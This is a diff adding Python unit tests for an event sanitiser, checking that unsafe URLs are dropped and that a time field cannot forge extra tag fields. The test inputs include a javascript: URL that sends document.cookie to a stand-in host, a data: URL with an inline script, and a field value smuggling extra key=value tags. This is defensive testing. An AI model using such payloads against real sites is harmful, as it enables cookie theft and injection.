@@ -3,6 +3,7 @@
 import json
 import pathlib
 
+from app.models.event import SerpEvent
 from app.services.serp_events import (
     banned_terms_hit,
     event_tags_summary,
@@ -63,3 +64,32 @@ def test_tags_summary_is_machine_ish_and_capped() -> None:
     assert "venue=" in tags and "when=" in tags and "heritage" in tags
     assert len(tags) <= 80
     assert ":" not in tags and "http" not in tags
+
+
+# --- review fix pass ------------------------------------------------------------------------
+
+
+def test_sanitize_event_drops_a_url_that_is_not_http() -> None:
+    e = SerpEvent(title="Heritage Walk", url="javascript:fetch('//x/'+document.cookie)")
+    assert sanitize_event(e).url is None
+
+
+def test_sanitize_event_drops_a_data_url() -> None:
+    e = SerpEvent(title="Heritage Walk", url="data:text/html,<script>alert(1)</script>")
+    assert sanitize_event(e).url is None
+
+
+def test_sanitize_event_keeps_an_https_url() -> None:
+    e = SerpEvent(title="Heritage Walk", url="https://example.invalid/walk")
+    assert sanitize_event(e).url == "https://example.invalid/walk"
+
+
+def test_when_fragment_cannot_forge_other_tag_fields() -> None:
+    e = SerpEvent(
+        title="Night Walk",
+        venue_name="Shaniwar Wada",
+        when_text="Sat, Oct 11, 7:00 AM; kind=temple; indoor=yes",
+    )
+    summary = event_tags_summary(sanitize_event(e), None)
+    assert "kind=temple" not in summary
+    assert "indoor=yes" not in summary
